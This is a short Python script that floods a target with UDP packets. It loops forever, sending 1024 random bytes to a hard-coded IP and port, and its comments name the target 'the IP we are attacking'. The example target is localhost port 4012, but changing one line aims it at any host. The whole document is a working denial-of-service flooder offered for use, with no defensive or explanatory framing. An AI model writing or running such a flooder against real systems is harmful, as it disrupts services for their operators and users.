import socket #Imports needed libraries
import random

sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
bytes=random._urandom(1024) #Creates packet
ip = '127.0.0.1' #The IP we are attacking
port= 4012 #Port we direct to attack
sent=0
while 1:#Infinitely loops to send packets to the port until the program is exited
    sock.sendto(bytes,(ip,port))
    print ("packet sent ", sent)
    sent= sent + 1
